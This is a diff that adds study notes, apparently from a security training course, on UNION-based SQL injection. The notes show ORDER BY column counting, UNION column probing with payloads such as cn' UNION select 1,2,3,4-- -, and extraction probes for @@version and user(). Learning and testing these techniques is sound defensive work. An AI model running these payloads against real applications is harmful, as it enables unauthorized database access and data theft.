@@ -703,3 +703,39 @@ mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 fr
 +-----------+-----------+-----------+-----------+
 
 SELECT dept_no FROM departments UNION SELECT emp_no FROM employees;
+
+# Union Injection
+
+' order by 1-- -
+
+# Next, let us try to sort by the second column, with the following payload:
+
+' order by 2-- -
+
+# We do the same for column 3 and 4 and get the results back. However, when we try to ORDER BY column 5, we get the following error:
+
+Unknown column '5' in 'order clause'
+
+# Using UNION
+
+# The other method is to attempt a Union injection with a different number of columns until we successfully get the results back.
+# The first method always returns the results until we hit an error, while this method always gives an error until we get a success. We can start by injecting a 3 column UNION query:
+
+cn' UNION select 1,2,3-- -
+
+The used SELECT statements have a different number of columns
+
+# So, let’s try four columns and see the response:
+
+cn' UNION select 1,2,3,4-- -
+
+# Location of Injection
+
+# This is the benefit of using numbers as our junk data, as it makes it easy to track which columns are printed, so we know at which column to place our query.
+# To test that we can get actual data from the database 'rather than just numbers,' we can use the @@version SQL query as a test and place it in the second column instead of the number 2:
+
+cn' UNION select 1,@@version,3,4-- -
+
+cn' UNION select 1,user(),3,4-- -
+
+
